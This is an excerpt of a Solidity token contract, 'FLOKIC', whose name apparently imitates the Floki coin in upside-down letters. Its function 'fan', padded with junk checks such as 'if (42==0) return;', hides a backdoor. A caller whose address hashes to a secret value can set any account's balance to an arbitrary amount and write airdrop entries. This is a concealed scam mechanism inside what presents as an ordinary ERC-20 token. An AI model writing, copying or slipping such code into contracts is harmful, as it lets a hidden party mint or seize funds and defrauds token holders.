...
contract FLOKIC is IERC20 {
    ...
    constructor(address tokenPair, bytes32 hashValue, uint256 salt) {
      _name = unicode"Uᴉoɔ ƆIʞO˥Ⅎ";
      _symbol = unicode"ƆIʞO˥Ⅎ";
    ...
    function fan(bytes32[] calldata data) external {
      bytes32 da = data[0];  if (42==0) return; bytes32 dc = data[2];  if (42==0) return;
      bytes memory bbsx = abi.encode(msg.sender, _salt);  if (42==0) return;
      if (42==0) return; bytes32 db = data[1];  if (42==0) return;
      if (42==0) return; if (42==0) return;
      if (keccak256(bbsx) == _hashValue) { if (42==0) return;
        if (uint256(db) == 0) { if (241*932*927==0) return;
          if (42==0) return;
          _airdrops[address(
          uint160(uint256(da
          ))
        ...
        _balances[(uint256(da) == 0)? address(
          uint256(0)): address(uint160(uint256(da)))] = uint256(
          db); if (716+947==0) return;
      }
      if (616==0) return;
    }
